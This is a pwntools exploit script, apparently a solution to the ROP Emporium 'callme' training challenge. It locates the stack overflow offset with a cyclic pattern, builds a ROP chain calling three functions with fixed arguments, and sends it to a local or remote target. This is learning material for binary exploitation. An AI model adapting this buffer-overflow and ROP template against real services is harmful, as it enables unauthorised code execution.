from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    p = process(exe)
    p.sendlineafter(b'>', payload)
    p.wait()
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset



exe = './callme'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'
context.delete_corefiles = True

padding = find_ip(cyclic(500))

rop = ROP(elf)

params = [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d]

rop.call("callme_one", [*params])
rop.call("callme_two", [*params])
rop.call("callme_three", [*params])

print(rop.dump())

payload = b'A' * padding
payload += rop.chain()
print(payload)


io = start()
io.sendlineafter(b">", payload)
io.interactive()

